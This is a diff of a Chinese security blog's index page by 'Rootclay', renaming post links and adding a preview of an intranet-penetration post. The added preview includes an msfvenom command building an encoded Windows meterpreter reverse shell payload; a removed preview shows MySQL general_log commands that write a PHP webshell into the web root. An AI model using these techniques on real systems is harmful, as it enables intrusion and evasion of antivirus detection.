@@ -132,14 +132,14 @@
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/archive/">Archives</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/archive/">Archives</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
@@ -209,7 +209,7 @@
 
 <div class="post-preview">
 
-    <a href="/2017/08/02/日志清理/">
+    <a href="/2017/08/02/clean_log/">
         <h2 class="post-title">
             日志清理
         </h2>
@@ -278,7 +278,47 @@ SOCKS代理是个不错的解决方案，不管应用层是什么协议，只要
 
 <div class="post-preview">
 
-    <a href="/2017/07/25/内网代理/">
+    <a href="/2017/07/25/msf/">
+        <h2 class="post-title">
+            In-Net MSF
+        </h2>
+        <h3 class="post-subtitle">
+            内网代理的个人总结.
+        </h3>
+        <div class="post-content-preview">
+            
+总结需要用到的msf技巧
+
+MSF内网渗透
+流程
+
+
+生成Payload：
+
+生成Python
+msfvenom -p windows/meterpreter/reverse_http LPORT=443 LHOST=IP -e x86/shikata_ga_nai -i 11 -f py -o ~/clay.py
+生成Exe
+msfvenom -p windows/x64/meterpr......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-07-25
+        </p>
+        <div class="tags">
+            
+              <a href="/tags/#Web" title="Web">Web</a>
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/07/25/Innet_proxy/">
         <h2 class="post-title">
             内网代理
         </h2>
@@ -408,7 +448,7 @@ Docker
 
 <div class="post-preview">
 
-    <a href="/2017/05/10/内网/">
+    <a href="/2017/05/10/Lemon_Intranet/">
         <h2 class="post-title">
             内网渗透
         </h2>
@@ -571,38 +611,6 @@ author:rootclay@syclover
 </div>
 <hr>
 
-<div class="post-preview">
-
-    <a href="/2017/03/23/mysql日志包含拿shell/">
-        <h2 class="post-title">
-            SQL语句利用日志写shell
-        </h2>
-        <h3 class="post-subtitle">
-            前不久刚出的SQL之间利用日志获取SHELL的姿势.
-        </h3>
-        <div class="post-content-preview">
-            outfile被禁止，或者写入文件被拦截
-
-1234show variables like '%general%';  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址select '&lt;?php......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-23
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Web" title="Web">Web</a>
-            
-              <a href="/tags/#SQL" title="SQL">SQL</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
 
 
 <!-- Pager -->
@@ -696,7 +704,7 @@ author:rootclay@syclover
     <ul>
       
         <li>
-          <a href="/2017/08/02/日志清理/">日志清理</a>
+          <a href="/2017/08/02/clean_log/">日志清理</a>
         </li>
       
         <li>
@@ -704,15 +712,15 @@ author:rootclay@syclover
         </li>
       
         <li>
-          <a href="/2017/07/25/内网代理/">内网代理</a>
+          <a href="/2017/07/25/msf/">In-Net MSF</a>
+        </li>
+      
+        <li>
+          <a href="/2017/07/25/Innet_proxy/">内网代理</a>
         </li>
       
         <li>
           <a href="/2017/06/01/Esrc议题/">ESRC成都站议题分享</a>
-        </li>
-      
-        <li>
-          <a href="/2017/05/29/xxe/">XXE</a>
         </li>
       
     </ul>
